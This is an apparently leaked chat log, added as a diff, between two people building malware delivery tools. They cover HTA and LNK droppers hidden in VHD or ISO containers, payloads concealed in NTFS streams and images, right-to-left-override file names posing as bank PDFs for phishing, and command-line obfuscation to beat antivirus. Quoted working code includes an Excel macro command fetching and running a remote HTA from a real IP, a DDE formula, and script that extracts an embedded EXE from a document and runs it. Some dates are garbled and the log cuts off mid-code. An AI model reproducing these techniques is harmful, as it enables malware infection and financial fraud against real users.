@@ -1,0 +1,713 @@
+[27.10.21 12:40:24] jaime: https://github.com/vysecurity/morphHTA
+[27.10.21 12:40:56] jaime: Hi. Have you looked here? Maybe there is something useful about it?
+[27.10.21 12:41:30] ryan: Hi, I'll check it out.
+[27.10.21 12:44:45] ryan: I want to make something similar, but in C++
+[27.10.21 12:53:27] jaime: And why in C++?
+[27.10.21 12:53:39] jaime: I did it in python for vbs
+[27.10.21 12:53:52] jaime: You can make an exe at a time
+[27.10.21 12:57:32] ryan: In C++ you can use bots, for example the bot must be registered in the system not as an exe file but as a hta
+[27.10.21 13:00:09] jaime: Well, maybe. But that's still the point that creates an intermediate file.
+[27.10.21 13:00:35] jaime: I also have no default hta handler, I kicked out a bunch of programs
+[27.10.21 13:00:52] ryan: What kind of windows was it ?
+[27.10.21 13:01:08] ryan: Not the server one ?
+[27.10.21 13:03:27] jaime: no regular 10
+[27.10.21 13:22:16] ryan: There Frances asks to make a test version with DLL, I will send it to you to try it? He says you're aware of it.
+[27.10.21 13:24:05] jaime: Come on, so there will be a rundll call?
+[27.10.21 13:24:21] ryan: Yes, I do it with rundll32
+[27.10.21 13:24:24] jaime: Or you can use a function?
+[27.10.21 13:24:56] jaime: That would be cool to have a function
+[27.10.21 13:25:49] jaime: I don't know about javascript :)
+[27.10.21 13:26:03] ryan: I found only way to call API from scripts via DynamicWrapper class, but it works in few places
+[27.10.21 13:26:21] ryan: now the most real way is via rundll32
+[27.10.21 13:27:24] ryan: From VBA scripts (winword, excel) winapi are easily called, but from other scripts this is a problem
+[27.10.21 13:46:49] ryan: I did it with test DLL: https://qaz.im/load/kFr3Q3/fzG45T
+[27.10.21 13:46:58] ryan: Passkey Zzzzzzz
+[27.10.21 13:53:14] jaime: Yeah, I'll check it now.
+[27.10.21 13:59:21] jaime: Norm. It works
+[27.10.21 13:59:50] jaime: Now you just need to obfuscate
+[27.10.21 14:00:18] ryan: I'll send you another version - there will be dll without entry point
+[27.10.21 14:04:08] ryan: https://qaz.im/load/4zQE3b/tAare8
+[27.10.21 14:04:14] ryan: Passport Zzzzzzz
+[27.10.21 14:06:01] jaime: rundll32 "+e+", TestAPI" ? What's the difference with the previous one?
+[27.10.21 14:07:09] ryan: The first was a standard DLL, the second has no entry point and DllMain function. There are only exports in it.
+[27.10.21 14:08:28] ryan: There is such a DLL format without entry point. Such DLLs are used by the system as containers for resources
+[27.10.21 14:08:38] jaime: Yeah, I got it, I didn't look at the dll itself. Although yes there were two calls, attach and export
+[27.10.21 14:08:58] jaime: Sometimes I use it myself :)
+[27.10.21 14:15:18] jaime: https://file.io/Pcx7uk7HYRdg
+[27.10.21 14:15:28] jaime: 386c5bb5a93dbf54587986251c6d8886
+[27.10.21 14:15:42] jaime: running lnk I did
+[27.10.21 14:16:01] jaime: two files are on the vxd container
+[27.10.21 14:16:10] jaime: Or in the same folder
+[27.10.21 14:16:18] jaime: There's a calculator
+[27.10.21 14:16:46] ryan: Let me see.
+[27.10.21 14:21:08] ryan: I have an idea to connect this lnk with hta. I'll try it, maybe it will work
+[27.10.21 14:22:28] jaime: I think just start hta from lnk directly via mshta.exe (or whatever it is exactly) and put everything into hta
+[27.10.21 14:22:43] jaime: And close everything somehow :)
+[27.10.21 14:23:45] ryan: lnk and hta want to merge them into one file
+[27.10.21 14:24:40] ryan: copy lnk to hta via cmd.exe, then run hta via mshta.exe
+[27.10.21 14:25:42] jaime: It's funny if lnk is big
+[27.10.21 14:25:45] ryan: Although there is a problem - how to get the lnk file name
+[27.10.21 14:25:57] jaime: Why?
+[27.10.21 14:26:29] jaime: I generate names randomly, and all in tmp. In builder.
+[27.10.21 14:27:27] ryan: Will lnk name always be constant ? So that it could be used in the copy command
+[27.10.21 14:27:59] jaime: no different
+[27.10.21 14:28:38] jaime: And icons are different
+[27.10.21 14:30:05] ryan: And there is no such requirement that everything was in one file ? It can all be a folder of several files ?
+[27.10.21 14:31:24] ryan: Then it's easier to call from lnk: "cmd.exe /C mshta.exe file.hta"
+[27.10.21 14:32:13] jaime: I'll send you a ready example
+[27.10.21 14:34:45] jaime: https://file.io/efXjkIexAc0P
+[27.10.21 14:34:54] jaime: ZpcwqmQkEm
+[27.10.21 14:35:08] jaime: this is the container itself with the same calculator
+[27.10.21 14:38:53] ryan: I see, so it's possible to make some set of files (hta, lnk or some other) which then will be put into vhd ?
+[27.10.21 14:40:05] jaime: Yeah absolutely. It would be cool to learn how to sign vhd
+[27.10.21 14:41:20] jaime: Right now all load is in txt, lnk takes it out and runs from there.
+[27.10.21 14:42:10] jaime: Is there any way to obfuscate javacript?
+[27.10.21 14:42:54] ryan: Yes, I plan to make a javascript obfuscator in C++
+[27.10.21 14:43:35] ryan: There are online obfuscators, but I don't like it if script gets into the wrong hands
+[27.10.21 14:43:57] jaime: Don't need any online :)
+[28.10.21 13:17:10] jaime: Hi!
+[28.10.21 13:17:26] jaime: And I do not understand how you removed the file? :)
+[28.10.21 13:18:23] ryan: Now instead of a separate file is written to NTFS stream hta file from which was launched
+[28.10.21 13:18:59] ryan: dll.hta:$ - NTFS stream with this name
+[28.10.21 13:19:16] jaime: interesting
+[28.10.21 13:20:27] ryan: But now for example if file system will be FAT then it will not work. It works only on NTFS. But NTFS is everywhere now
+[28.10.21 13:25:10] jaime: Perfect. Screwed it into builder.
+[28.10.21 13:26:03] ryan: Now the next plan is to add encryption, so that the exe was not in clear form
+[28.10.21 13:26:46] jaime: I think it is not necessary, mostly load is clean
+[28.10.21 13:26:48] ryan: Then after that you obfuscate the script
+[28.10.21 13:37:02] jaime: Can you make another version? What would the load pick up from the address and run? :)
+[28.10.21 13:37:20] jaime: I'm not a js guy! :)
+[28.10.21 13:38:08] ryan: Ok, I'll try to do it.
+[28.10.21 13:38:33] jaime: Thanks :)
+[29.10.21 09:20:19] ryan: Hi
+[29.10.21 09:20:43] ryan: made a download and run https://qaz.im/load/aFfSbT/rHH6AT pass zzzzz
+[29.10.21 09:21:43] ryan: Now there is a link http://localhost/... - change it to your own
+[29.10.21 10:29:41] jaime: hi! yeah thanks, got it!
+[01.11.21 11:46:16] jaime: https://file.io/SLhj9jZJe2iF
+[01.11.21 11:46:35] jaime: 660936a341165c46d1120db42f9fdb17
+[01.11.21 11:47:26] jaime: I attached the obfuscator to your code + random variable names
+[01.11.21 11:48:04] jaime: I got this famous obfuscator on nodejs that hangs online
+[01.11.21 11:48:34] jaime: There is a calculator inside
+[01.11.21 11:48:38] ryan: Let me have a look
+[01.11.21 12:00:32] ryan: Great, you can also hide lines: instead of "WScript.Shell" write: str='W', str+='S', str+='c', etc.
+[01.11.21 12:03:55] jaime: Yeah, I wonder if there are any ready-made switches
+[01.11.21 12:16:09] jaime: That obfuscator can do it
+[01.11.21 12:16:27] jaime: avhMvyrpKsPG=Q['g'+'e'+'t'+'f'+'i'+'l'+'e']
+[08.11.21 11:33:07] jaime: And can you throw me the info on the pdf, the one in the group _svg wrote
+[08.11.21 11:33:13] jaime: It's all gone null.
+[08.11.21 11:33:26] ryan: I'll send it over.
+[08.11.21 11:35:48] ryan: https://qaz.im/load/FeSFGT/8yiz6e 2 pass sdf76s8ysh8$23r2234rrt@#45
+[08.11.21 11:36:19] ryan: There is a variant of hta and wsf extension masking under pdf
+[08.11.21 11:36:57] ryan: pdf extension will be displayed only in Explorer, in archiver for example there will be distorted file name
+[08.11.21 11:44:53] jaime: Yeah thanks. :)
+[08.11.21 11:44:58] jaime: I'll have a look.
+[08.11.21 11:52:43] jaime: What weird names :)
+[08.11.21 11:54:39] ryan: You can do this for example ath.bankofamerica.com - credit approval.pdf
+[08.11.21 11:56:57] ryan: "fsw.hsbc.co.uk - need your approval for transfer funds.pdf"
+[08.11.21 12:15:37] jaime: Is there anything to read? To get the gist of it?
+[11.11.21 12:16:12] jaime: Actually it's very funny. Is it on topic with unicod controllers?
+[08.11.21 12:20:33] ryan: Yes, the string is written backwards. In unicode it is used for languages like Arabic, where you write from right to left
+[08.11.21 12:20:45] ryan: complete list of control codes - https://ru.wikipedia.org/wiki/%D0%A3%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D1%8F%D1%8E%D1%89%D0%B8%D0%B5_%D1%81%D0%B8%D0%BC%D0%B2%D0%BE%D0%BB%D1%8B
+[08.11.21 14:23:13] jaime: And how can I see what characters are in the name? :)
+[08.11.21 14:23:44] jaime: I see some shit in headlight :)
+[08.11.21 14:24:22] ryan: Copy the name into Notepad and save it as unicode. Then open saved text in headlamp or hex editor
+[08.11.21 14:24:45] jaime: Oh, thank you. :)
+[08.11.21 14:41:25] jaime: So maybe I'm completely stupid. I don't know how to copy the name. I copy in Far, I get something like E2 80 E2 80
+[08.11.21 14:43:02] ryan: You need to rename file in explorer, press Ctrl-A then Ctrl-Insert, it will copy it to clipboard
+[08.11.21 14:44:13] ryan: Then in Notepad Shift-Insert and then save it in unicode
+[08.11.21 14:47:33] jaime: I copy in ubuntu
+[08.11.21 14:47:47] jaime: I'm not very good with wine
+[08.11.21 14:52:12] ryan: Another way you can do: in hex editor create file with four bytes: FE FF 20 2E and copy any unicode string to it. After copying to those bytes it will be shown in reverse direction
+[08.11.21 14:53:15] ryan: FE FF is a sign that text is unicode (under windows it is, under linux I don't know it is or not). 20 2E - unicode control characters for line reversal
+[08.11.21 14:54:36] ryan: Another way: copy reverse string character from here: https://unicode-explorer.com/c/202E
+[08.11.21 14:54:55] ryan: And insert it before the string you want to reverse
+[08.11.21 14:56:16] jaime: I got it. Thanks. I'm having fun now :)
+[08.11.21 14:57:02] ryan: In explorer you can paste this symbol while renaming a file, in KDE on linux it will probably work too
+[08.11.21 14:57:50] jaime: I can't see the names either.
+[16.11.21 13:36:52] jaime: Hi. :)
+[16.11.21 13:43:14] ryan: Hi.
+[16.11.21 13:52:16] jaime: I just need to attach hta to the picture? :)
+[16.11.21 13:56:49] ryan: builder.exe writes in the beginning of hta file a picture and in the hta script itself prescribes the offset, from where to read an encrypted exe file
+[16.11.21 13:57:39] ryan: Just linking hta and the picture with the copy command doesn't work. Script will start, but it won't decrypt exe correctly
+[16.11.21 14:11:07] jaime: Oh, right, I forgot! :)
+[16.11.21 15:08:50] jaime: I like the theme with the picture, especially in the container
+[11/16/21/221 15:15:10] ryan: You can rename from lnk to hta with one command. Or copying
+[16.11.21 15:15:44] jaime: Yeah exactly, everything will be fine on the image
+[16.11.21 15:28:13] jaime: https://file.io/RmusT10VKze9
+[16.11.21 15:28:21] jaime: 620a6e494beae2df96f469bf48420cc7
+[16.11.21 15:29:09] jaime: If you want to check it out, run it through lnk. Your picture idea :) Load calculator.
+[16.11.21 15:29:51] ryan: It didn't download, file deleted
+[16.11.21 15:32:06] jaime: ``
+Download: https://qaz.im/load/r2haSS/nB3E6Q
+Delete: https://qaz.im/index.php?a=delete&q=1043067380
+```
+[16.11.21 15:32:09] jaime: 620a6e494beae2df96f469bf48420cc7
+[16.11.21 15:35:28] ryan: downloaded
+[11/16/21 15:45:13] ryan: I tried to run "mshta.exe %tmp%\readme.jpg" but it didn't work, it would open a picture instead of hta. Too bad, renaming to hta won't do without it
+[16.11.21 15:47:37] jaime: And with lnk?
+[16.11.21 15:49:08] ryan: It's the same, opens in explorer, explorer knows by extension what program to call to handle the file
+[16.11.21 15:50:09] ryan: You can copy a jpg into hta, call hta and delete it when hta is done. That way it's also unnoticeable.
+[11/16/21/221 15:51:30] ryan: It's like in lnk now, but you can add &&del %tmp%\filename.hta at the end
+[11/18/21 11:48:41] jaime: Hi.
+[11/18/11/21 11:49:00] ryan: Hi.
+[11/18/11/21 11:49:21] jaime: 2. Who has encrypted exe now stored in separate NTFS stream instead of at the end of file?
+[18.11.21 11:49:36] jaime: And can you throw what to read or look at?
+[11/18/11/21 11:49:46] jaime: about NTFS stream
+[18.11.21 12:10:18] ryan: I'll send it to you right away.
+[18.11.21 12:11:41] ryan: https://ru.wikipedia.org/wiki/%D0%90%D0%BB%D1%8C%D1%82%D0%B5%D1%80%D0%BD%D0%B0%D1%82%D0%B8%D0%B2%D0%BD%D1%8B%D0%B5_%D0%BF%D0%BE%D1%82%D0%BE%D0%BA%D0%B8_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85
+[18.11.21 12:12:35] ryan: That is, for example, there is file 12345.txt and you can add an additional file to it through a colon 12345.txt:stream1
+[18.11.21 12:13:27] ryan: HTA already sent me stream files, only there stream was used as a temporary file
+[18.11.21 12:23:26] jaime: Yes I saw it as temporary, I understand it. But the way you want it now, not so much.
+[18.11.21 12:25:20] ryan: In the archiver you can specify "save files together with all their" NTFS streams. The encrypted EXE would not be stored at the end of file result.jpg as it is now, but in a separate stream named reulst.hta:stream1
+[18.11.21 12:26:10] ryan: After unpacking the archive, the stream with the name result.hta:stream1 will be saved, and the script will read the encrypted file from the stream1
+[18.11.21 12:26:48] ryan: In this case antiviruses inside the archive check only files, but they don't look at the streams attached to them
+[18.11.21 12:28:47] jaime: I don't really understand the difference between a stream and a file in this case. I'd rather read. Thank you. :)
+[18.11.21 12:36:49] ryan: The file is hidden in the flow. In explorer or any other file manager, only the result.hta file is visible. It's generally more hidden with threads, it's an extra disguise.
+[18.11.21 13:43:46] jaime: If I copy a file, will its associated stream get copied over?
+[11/18/21 13:44:40] jaime: Do you think it's more convenient than storing in hta?
+[11/18/21 13:45:16] ryan: If copying was made within one logical disk, then the threads are stored
+[11/18/21 13:45:57] ryan: On the contrary, it will be more uncomfortable than in HTA, but it gives more secrecy
+[18.11.21 13:46:19] ryan: For example inside archive files streams are not checked by anti-viruses at all
+[18.11.21 15:12:04] jaime: You can run hidden thread via wmic process call create with full path to the thread
+[18.11.21 15:12:40] ryan: I'll try it now
+[18.11.21 15:15:18] ryan: This script can also start threads via wmic:
+```
+<script language=vbscript>
+
+set w=getobject("winmgmts://./root/cimv2")
+set b=w.get("Win32_Process").Methods_("Create").InParameters.SpawnInstance_:b.commandline="calc.exe"
+set s=w.execmethod("Win32_Process", "Create",b)
+
+</script>
+
+```
+[18.11.21 15:15:47] ryan: But your variant is in one line and you can use it in lnk
+[18.11.21 15:16:32] jaime: yes but it's too easy, everything is open
+[29.11.21 15:55:47] jaime: Hi. Can you tell me how I can mask the mshta.exe call to the command line? I have a detection on the lnk right away. When opening a container.
+[29.11.21 15:57:35] ryan: instead of mshta.exe you can write mshta.exe.
+[29.11.21 15:58:41] ryan: Do you have a command line masking manual ? I posted it in #cyberpunk. If not, I'll send it to you.
+[29.11.21 16:00:28] jaime: no. It's all erased.
+[29.11.21 16:00:37] jaime: Send it please.
+[29.11.21 16:00:37] ryan: I'll send it over.
+[29.11.21 16:00:48] jaime: Thanks in advance. :)
+[29.11.21 16:02:59] ryan: manual https://qaz.im/load/GNrTYN/7f4Dri pass sd09f7sdf098fs90d8f0ds8d90s8f0ds8f0ds8f
+[29.11.21 16:03:06] ryan: There are many different ways you can distort the command line
+[11/29/221 16:07:45] jaime: Got it, thanks. I'll see if it goes away or not.
+[29.11.21 17:43:33] jaime: It's ok.
+[29.11.21 17:43:50] jaime: What's interesting, I use def calculator and it does not swear.
+[29.11.21 17:43:59] jaime: I start load and it blows up
+[29.11.21 17:44:51] ryan: Maybe the load file itself is straying?
+[29.11.21 17:45:12] jaime: said clean
+[30.11.21 14:02:08] jaime: Hi! Took your latest POC from wordpad, run x.bat, wordpad starts, what am I wrong with it?
+[30.11.21 14:09:42] ryan: Hi
+[30.11.21 14:09:47] ryan: On what system ?
+[30.11.21 14:11:38] jaime: Windows 10 64
+[30.11.21 14:12:08] jaime: Rus
+[30.11.21 14:15:28] ryan: Let me see
+[30.11.21 14:23:27] ryan: I'll send you another one
+[30.11.21 14:28:03] ryan: Try this https://qaz.im/load/HSbEBn/QEt6d8 password 346534345345345345
+[30.11.21 14:36:15] ryan: Does the new one work ?
+[11/30/21 14:40:40] jaime: I'll check it now. Distracted
+[30.11.21 14:41:27] jaime: Oh yeah all ok!
+[11/30/21 14:41:34] ryan: Great.
+[11/30/21 14:41:53] jaime: How about that? :)
+[30.11.21 14:42:50] ryan: forgot to erase path to programw6432
+[30.11.21 14:43:14] jaime: how does it work? :)
+[30.11.21 14:44:29] ryan: Via variable set erase path to folder "Program Files", where real wordpad.exe lies
+write.exe can't find the real wordpad.exe and launches it from the current folder
+[01.12.21 16:22:07] jaime: Hi. :) Can you help with one question? :)
+[01.12.21 16:22:52] ryan: Hi.
+[01.12.21 16:26:09] jaime: I have created an ISO file. I put autorun.inf into it, but it won't run. I right click on the disk, there's no 'Open autorun' there. Do you know what it could be?
+[01.12.21 16:27:35] ryan: starting with Windows 7 autorun has been removed from disks
+[01.12.21 16:27:36] jaime: I use powershell Mount-DiskImage -ImagePath
+[01.12.21 16:27:48] ryan: Only under XP will run
+[01.12.21 16:28:01] jaime: But VirtualBox Disk has it and there is such a menu item
+[01.12.21 16:28:38] jaime: yes it doesn't start, but there is a menu item
+[01.12.21 16:28:52] jaime: Icon is picked up by the way
+[01.12.21 16:28:59] jaime: And the disk label
+[01.12.21 16:29:50] ryan: To enable autorun you must edit this key in the registry
+```
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+```
+[01.12.21 16:30:11] ryan: Value "NoDriveTypeAutoRun"=dword:000000
+[01.12.21 16:31:28] jaime: I turned it on
+[01.12.21 16:33:49] jaime: I guess explorer has some kind of mounting feature
+[01.12.21 16:34:38] jaime: If I mount vhd, there is menu item, not on ISO
+[01.12.21 16:35:06] ryan: And this key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\disableAutoplay ?
+[01.12.21 16:38:15] jaime: I don't have that
+[01.12.21 16:39:54] jaime: it's not clear why it's different for ISO and for vhd
+[01.12.21 16:41:14] ryan: Maybe because vhd is treated as flash drive by the system
+[01.12.21 16:42:17] jaime: I also don't understand why iso is mounted as a DVD, but can it be forcibly mounted as a CD? Sorry for the stupid questions.
+[01.12.21 16:42:28] ryan: for USB flash drives since Win 7 autorun is disabled, for CDs - you can turn it on somehow in the registry
+[01.12.21 16:43:45] jaime: When I plug in a vhd, I get a menu with a choice of actions, but there is no start of my program. I wanted to add my program to the selection
+[01.12.21 16:44:14] jaime: I thought it would work with ISO
+[01.12.21 16:44:47] jaime: VirtualBox has it in the startup when it monitors its GuestAdditition
+[01.12.21 16:44:48] ryan: maybe it was formatted as a DVD drive in the beginning, file system type was not specified as Fat, ntfs or similar during formatting
+[01.12.21 16:45:09] jaime: And the disk iso9660
+[01.12.21 16:45:18] jaime: You can't even create another one there
+[01.12.21 16:46:13] jaime: If I mount iso with guest additition via explorer, it also becomes a dvd without autorun.
+[16.12.21 09:11:02] jaime: Hi!
+[16.12.21 09:12:49] ryan: Hi.
+[16.12.21 09:13:53] jaime: Do you want to make a repo with docs and examples?
+[16.12.21 09:14:02] jaime: Do you already have one?
+[16.12.21 09:14:22] jaime: Because the channel was cleared, and I wanted to get some information there.
+[16.12.21 09:15:07] ryan: All that is in one dock collect? Yes, that was a thought. I can do.
+[16.12.21 09:20:40] jaime: Maybe on our git?
+[16.12.21 09:20:54] jaime: there's a dock and examples, it would be very convenient.
+[16.12.21 09:21:13] ryan: Ok, I'll make a separate branch in the git
+[16.12.21 09:21:48] jaime: Great, great. It's a shame, the channel zeroes out, the work is lost.
+[01.02.22 14:35:02] jaime: Hi!
+[01.02.22 14:35:31] ryan: Hi
+[01.02.22 14:36:06] jaime: Can you suggest a tool to extract macros from xls?
+[01.02.22 14:36:19] jaime: Or in general how to do it?
+[01.02.22 14:37:36] ryan: xls is actually a zip archive, you unpack it with for example Windrar or any other archiver and look for vbaproject.bin file in the unpacked files
+[01.02.22 14:37:53] jaime: I took this one https://github.com/DissectMalware/XLMMacroDeobfuscator
+[01.02.22 14:38:52] ryan: Next you'll install Far Manager and its Doc Browser plugin and then you'll look through vbaproject.bin file as usual folder
+[01.02.22 14:39:35] jaime: I see 3 files [5]DocumentSummaryInformation,[5]SummaryInformation, Workbook
+[01.02.22 14:40:21] ryan: xls file, from old excel. Not xlsx ?
+[01.02.22 14:40:33] jaime: xls
+[01.02.22 14:41:07] ryan: Open xls via Far Manager with Doc Browser plugin installed
+[01.02.22 14:43:13] ryan: NewMacros and ThisDocument there are no such files ?
+[01.02.22 14:45:21] jaime: I set it, I see the same as when I rename it to zip
+[01.02.22 14:45:45] jaime: [5]DocumentSummaryInformation
+[5]SummaryInformation
+Workbook
+[01.02.22 14:49:28] ryan: Now I opened my old Excel, there are 3 files inside it and also a folder called _VBA_PROJECT_CUR
+[01.02.22 14:50:17] ryan: I opened it in Far Manager with Doc Browser plugin
+[01.02.22 14:51:03] ryan: Send me this file, I'll try to unpack it
+[02.02.22 08:51:42] jaime: Hi!
+[02.02.22 08:52:02] jaime: Are you familiar with this technique: https://github.com/echtdefault/MalDoc-Embedded-EXE-Bin-
+[02.02.22 08:53:55] ryan: Hi
+[02.02.22 08:54:00] ryan: Let me have a look
+[02.02.22 09:00:11] ryan: There, as I understand, just a way how to hide EXE inside a doc file, without running ?
+In Winword in the menu choose "Insert object" and insert EXE, then choose "Save as RTF"
+And there is a VBA macro that extracts this EXE
+[02.02.22 09:13:51] jaime: It goes like this. But it didn't work for me. :)
+[02.02.22 09:14:58] jaime: Can I send you xls? The one I told you about yesterday?
+[02.02.22 09:15:44] ryan: Send it to me.
+[02.02.22 09:17:13] jaime: Now.
+[02.02.22 09:17:25] jaime: Have you seen this? https://github.com/klezVirus/CVE-2021-40444
+[02.02.22 09:18:50] jaime: ``
+Download: https://qaz.im/load/GfT7T9/DtbYdF
+Delete: https://qaz.im/index.php?a=delete&q=1617189107
+```
+[02.02.22 09:19:02] jaime: b56aee8393a567d5aeb510269f72dbbe
+[02.02.22 09:20:05] jaime: To my meager knowledge, except for downloading and executing hta file there is nothing here.
+[02.02.22 09:20:27] jaime: I want to hear your expert opinion.
+[02.02.22 09:20:59] ryan: downloaded, now I will watch
+[02.02.22 09:44:58] ryan: I unpacked it, I see no scripts.
+Passcode e0g9dfsg0f0df9g8d90fg8
+```
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/unpacked_xls.rar
+```
+[02.02.22 09:48:13] jaime: How do you unpack a workbook? :)
+[02.02.22 09:50:09] ryan: There's a standard zip archive
+[02.02.22 09:50:50] jaime: And how does it take away load?
+[02.02.22 09:51:24] jaime: I mean xls
+[02.02.22 09:53:13] ryan: Runs a command
+```
+CMD.EXE /c mshta http://91.240.118.172/cc/vv/fe.html
+```
+[02.02.22 09:54:46] ryan: Only the command line startup is visible, downloading and running the hta script. Vba scripts are not visible
+[02.02.22 09:55:16] jaime: I decided the same, but whether there is something else.
+[02.02.22 09:55:35] jaime: What's the beauty of this way?
+[02.02.22 09:56:24] jaime: Another stupid question, where is the startup line in the Workbook itself?
+[02.02.22 09:58:19] ryan: The window with macros doesn't show up
+But it doesn't work in many places.
+There's a formula in the table cell with command line call
+I'll look for description of this exploit.
+[02.02.22 10:03:58] ryan: We put this formula into an Excel cell:
+```
+=cmd|'/C calc'!A0
+```
+When you click on the cell, the calculator will start
+[02.02.22 10:07:30] ryan: When you open xls, excel will most likely give you a warning about automatic opening links
+[02.02.22 10:13:38] jaime: Got it. Thanks for the information. :)
+[02.02.22 15:14:28] jaime: I have by the way =cmd|'/C calc'!A0
+[02.02.22 15:14:46] jaime: I'm looking at just this mechanism
+[02.02.22 15:17:17] ryan: Probably because the office is new
+Just tested it with CSV files, it appeared to work only on old offices
+[02.02.22 15:17:44] jaime: I have 2016
+[02.02.22 15:18:24] ryan: It will not run on it most likely
+[03.02.22 09:43:31] jaime: Hi.
+[03.02.22 09:43:44] jaime: Can I ask you a silly question? :)
+[03.02.22 09:45:49] ryan: Hi.
+[03.02.22 09:46:01] jaime: If you're not busy :)
+[03.02.22 09:46:41] ryan: Not busy
+[03.02.22 09:47:34] jaime: Here we are looking at xls file as archive, but where actually data for cells?
+[03.02.22 09:52:58] ryan: I'll look, they seem to be written at the end of the workbook file
+[03.02.22 09:54:26] jaime: It is not listed as a file in the archive?
+[03.02.22 09:55:32] ryan: In the just created file in the Worksheets folder there are files named sheet1.xml, sheet2.xml and so on for each sheet
+But yesterday's file doesn't have this folder
+[03.02.22 09:56:56] jaime: Do you know the utility oledump?
+[03.02.22 09:58:15] ryan: Cell data is located between <f> </f> tags in sheet*.xml files
+Oledump did not use
+[03.02.22 09:58:27] jaime: it gets the data out of that xls
+[03.02.22 09:58:54] jaime: ``
+ '0085 15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \x00Protec' '0085 13 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00LINK' '0085 14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - \x00Sheet' '0018 23 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d \x00Protec!R1C3 ' 0006 81 FORMULA : Cell Formula - R3C3 len=59 ptgStr "CMD.EXE /c mshta http://91.240.118.172/cc/vv/fe.html" ptgFuncVarV args 1 func EXEC (0x006e) 0006 26 FORMULA : Cell Formula - R5C3 len=4 ptgFuncVarV args 0 func HALT (0x0036)
+```
+[03.02.22 09:59:32] ryan: Let me see how it looks for cells. It's written in python, I think.
+[02/03/222 10:04:40] ryan: In newer versions of excel they store cells in sheet*.xml files.
+Yesterday's file is in the old format, I forgot about that.
+I'm looking at it now.
+[03.02.22 10:08:44] jaime: In general it's an interesting utility
+[03.02.22 10:09:38] jaime: I just want to automatically build the same xls, one-to-one
+[03.02.22 10:10:52] ryan: I look at workbook file - there are like 2 files in it going one by one.
+Now try to extract the second archive from there
+[03.02.22 10:40:40] ryan: I found this: in old Excel files, cell data lie between the lines "ffffff", sheets are separated from each other by lines "333333"
+But this is just a guess, I do not know exactly whether it is in fact
+[02/03/222 11:31:30] jaime: Got it. And have you automated the dock assembly with the load?
+[03.02.22 11:45:56] ryan: Not yet, I'm busy with new admin and parsing pdf
+[09.02.22 09:32:32] jaime: Hi.
+[09.02.22 09:35:09] ryan: Hi
+[09.02.22 10:07:06] jaime: remember the jpg load topic
+[09.02.22 10:07:31] jaime: You can paste it into a document
+[09.02.22 10:07:52] jaime: And how to save this picture to disk from the document?
+[09.02.22 10:13:03] ryan: Should I do it with VBA script ? Get the picture from the contents of the document and save to disk
+[09.02.22 10:14:08] jaime: Yes. I couldn't find it.
+[09.02.22 10:14:21] ryan: Let me have a look.
+[09.02.22 10:14:32] jaime: Shouldn't be too hard, picture has a name
+[09.02.22 10:14:46] jaime: I looked in xls
+[09.02.22 10:15:16] jaime: Shape can be saved, but it will be essentially a screen area
+[09.02.22 10:15:31] jaime: There won't be any load
+[09.02.22 10:19:14] jaime: And in general, how do you think the theme is normal?
+[09.02.22 10:19:36] jaime: I also found this one: https://github.com/hasherezade/pe_to_shellcode
+[09.02.22 10:20:09] jaime: I haven't looked at it yet. The idea is that you can make a shellcode and put it into a dock and run it without the disk
+[09.02.22 10:21:42] ryan: Now I saw this - the picture in the saved document is stored in the folder media
+I.e. I unpack the archive and take out the picture from there.
+I'm looking at it now.
+[09.02.22 10:22:23] jaime: I looked xls there is no folder :)
+[09.02.22 10:22:55] ryan: I look in Word document, now look in xls
+[09.02.22 10:23:26] jaime: There must be some way through vbs
+[09.02.22 10:24:27] jaime: Can I send you my xls?
+[09.02.22 10:24:57] ryan: Send it and I'll have a look at it.
+[09.02.22 10:25:41] jaime:
+[09.02.22 10:26:40] ryan: downloaded
+[09.02.22 10:27:04] jaime: Here is a picture with the cat
+[09.02.22 10:27:57] jaime: This is hta
+[09.02.22 10:28:07] jaime: Running a calculator
+[09.02.22 10:28:44] jaime:
+[09.02.22 10:28:51] jaime: Here it is separately
+[09.02.22 10:29:55] ryan: In the document the picture is at address 0x361E, there will be the string "JFIF"
+[09.02.22 10:30:35] jaime: Can you get there from the script when you open it?
+[09.02.22 10:30:52] ryan: Now I'll try to make a script that will read the picture from the document from which it was launched
+[09.02.22 10:31:22] jaime: Oh thank you. :)  That would be cool.
+[09.02.22 10:32:04] ryan: I once made a vba script that reads an exe from the end of a document. Now I'll find it and remake to read picture from the middle of the document.
+[09.02.22 10:34:26] jaime: Yes you can send me the development, I'll try to figure it out
+[09.02.22 10:34:40] jaime: And in general it's cool to run without disk
+[09.02.22 10:34:49] ryan: Looking for it now.
+[09.02.22 10:36:18] ryan: I found it in Javascript, now I will find it in VBA:
+```
+	var FS = new ActiveXObject("Scripting.FileSystemObject");
+	var fil = FS.GetFile(location.pathname.substr(1).replace(/[/]/g,"\\\"));
+	fpga = fil.OpenAsTextStream().Read(fil.Size);
+
+	x = fpga.substr(117725, 468056);
+
+	var fso = new ActiveXObject("Scripting.FileSystemObject");
+	ts = fso.createTextFile(location.pathname.substr(1).replace(/[/]/g,"\\\")+".exe");
+	ts.Write(x);
+	ts.Close();
+
+	x=new ActiveXObject("WScript.shell");
+	x.run(location.pathname.substr(1).replace(/[/]/g,"\\\")+"..exe");
+```
+[09.02.22 10:37:30] ryan: The main idea is that file is opened with OpenTextAsStream and it can be parsed by bits, not as a string
+[09.02.22 10:40:49] jaime: Yeah, I think I'll redo it.
+[09.02.22 10:41:11] ryan: ``
+Sub autoopen()
+Set f = CreateObject("scripting.filesystemobject"): Set e = f.getfile(ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name):
+Dim a(1000000 - 1) As Byte: s = e.Size - UBound(a) - 1: Dim b(1375733) As Byte:
+Open (ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name) For Binary As #7: Get #7, 1, b: Close #7:
+
+Dim key(5) As Byte
+key(0) = 1: key(1) = 2: key(2) = 3: key(3) = 4: key(4) = 5:
+j = 0
+For i = 0 To (e.Size - s - 1)
